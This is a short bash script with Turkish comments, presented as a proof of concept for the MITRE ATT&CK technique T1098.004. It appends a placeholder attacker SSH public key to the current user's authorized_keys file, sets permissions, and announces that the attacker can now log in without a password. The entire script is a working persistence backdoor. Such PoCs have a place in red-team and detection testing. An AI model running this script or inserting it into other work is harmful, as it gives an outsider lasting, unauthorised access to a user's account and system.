#!/bin/bash
#T1098.004 - SSH Authorized Keys PoC

echo "SSH authorized_keys saldirisi basliyor..."

#.ssh dizini yoksa olustur
if [ ! -d "$HOME/.ssh" ]; then
    mkdir -p "$HOME/.ssh"
    chmod 700 "$HOME/.ssh"
fi

#Saldirganin Public Key'i
ATTACKER_PUB_KEY="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC... saldirgan@arch"

#Duplicate kontrolu
grep -qxF "$ATTACKER_PUB_KEY" "$HOME/.ssh/authorized_keys" 2>/dev/null || \
echo "$ATTACKER_PUB_KEY" >> "$HOME/.ssh/authorized_keys"

#izinleri ayarla
chmod 600 "$HOME/.ssh/authorized_keys"

echo "Islem tamam saldırgan artık sifresiz ssh atabilir."
echo "Kontrol icin >>> cat ~/.ssh/authorized_keys"